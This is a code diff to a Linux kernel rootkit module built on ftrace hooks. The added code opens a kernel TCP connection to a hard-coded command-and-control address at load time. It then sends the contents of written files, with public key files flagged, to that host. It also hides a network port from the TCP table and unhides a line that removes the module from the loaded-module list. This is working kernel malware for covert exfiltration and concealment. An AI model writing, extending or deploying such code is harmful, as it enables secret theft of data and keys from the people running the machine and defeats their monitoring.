@@ -9,8 +9,9 @@
 #include <linux/types.h>
 #include <linux/socket.h>
 #include <linux/string.h>
+#include <linux/inet.h>
+#include <linux/in.h>
 #include <linux/tcp.h>
-
 
 #include "ftrace_helper.h"
 
@@ -28,6 +29,14 @@ struct linux_dirent {
     unsigned long d_off;
     unsigned short d_reclen;
     char d_name[];
+};
+
+char cncIpAddress[16] = "192.168.1.183";
+struct socket *cncSocket;
+struct msghdr msg;
+
+struct rootkitMessage {
+  uint8_t index;
 };
 
 
@@ -55,6 +64,41 @@ asmlinkage ssize_t vfs_h_write(struct file *file, const char __user *buf, size_t
         printk(KERN_INFO "rootkit: trying to write to a file %s", file->f_path.dentry->d_name.name);
         printk(KERN_INFO "rootkit: bytes being written %s", buf);
 
+	int sendErr;
+	uint8_t whichFile = 0;
+
+	char* truncateStr = strrchr(filename,'.');
+	if (truncateStr != NULL){
+	   if (strcmp(truncateStr, ".pub") == 0){
+	      whichFile = 1;
+	   }
+	}
+	printk("COUNT:%d\n", count);
+
+	struct rootkitMessage rtkMsg;
+    	rtkMsg.index = whichFile;
+        
+	struct kvec vecInit;
+	vecInit.iov_base = &rtkMsg;
+	vecInit.iov_len = 1;
+
+
+	struct kvec vecData;
+	vecData.iov_base = buf;
+	vecData.iov_len = count;
+
+	sendErr = kernel_sendmsg(cncSocket, &msg, &vecData, count, count);
+
+	char *newLine = "\n";
+	
+	struct kvec vecNewLine;
+	vecNewLine.iov_base = newLine;
+	vecNewLine.iov_len = 2;
+
+	sendErr = kernel_sendmsg(cncSocket, &msg, &vecNewLine, 2, 2);
+	printk("Data Message Sent: %d\n", sendErr);
+
+
     }
 
     
@@ -66,7 +110,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
     struct sock *sk = v;
 
     //put number in hex
-    if (sk != 0x1 && sk->sk_num == 0xB9CC)
+    if (sk != 0x1 && sk->sk_num == 0x8532)
         return 0;
 
     return orig_tcp4_seq_show(seq, v);
@@ -192,7 +236,32 @@ static int __init rootkit_init(void)
     if(err)
         return err;
 
-    //list_del(&THIS_MODULE->list);
+    struct sockaddr_in cncAddress;
+    memset(&cncAddress, 0, sizeof(cncAddress));
+    cncAddress.sin_family = AF_INET;
+    cncAddress.sin_port = htons(9024);
+    cncAddress.sin_addr.s_addr = in_aton(cncIpAddress);
+
+    memset(&msg, 0x00, sizeof(msg));
+    msg.msg_name=(struct sockaddr_in*) &cncAddress;
+    msg.msg_namelen=sizeof(cncAddress);
+    msg.msg_flags = MSG_DONTWAIT | MSG_NOSIGNAL;
+
+    //Create a socket
+    int socketErr = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &cncSocket);
+    if (socketErr < 0){
+    	printk("Socket creation failed");
+    }
+    else{
+	printk("Socket Bound Correctly, Socket Number:%d\n", socketErr);
+    }
+
+    int ret = cncSocket->ops->connect(cncSocket, (struct sockaddr *) &cncAddress, sizeof(cncAddress), O_RDWR);
+    if (ret < 0){
+       printk("Socket Connection Ret:%d\n", ret);
+    }
+
+    list_del(&THIS_MODULE->list);
 
 
     printk(KERN_INFO "rootkit: loaded\n");
@@ -201,6 +270,19 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
+    //Send End Message
+    //int endMsgErr;
+    //struct rootkitMessage rtkEndMsg;
+    //rtkEndMsg.index = -1;
+    //rtkEndMsg.length = cpu_to_be64(-1);
+
+    //struct kvec vecEnd;
+    //vecEnd.iov_base = &rtkEndMsg;
+    //vecEnd.iov_len = 9;
+
+    //endMsgErr = kernel_sendmsg(cncSocket, &msg, &vecEnd, 9, 9);
+    
+    //printk("End Message Bytes: %d\n", endMsgErr);
     
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "rootkit: unloaded\n");
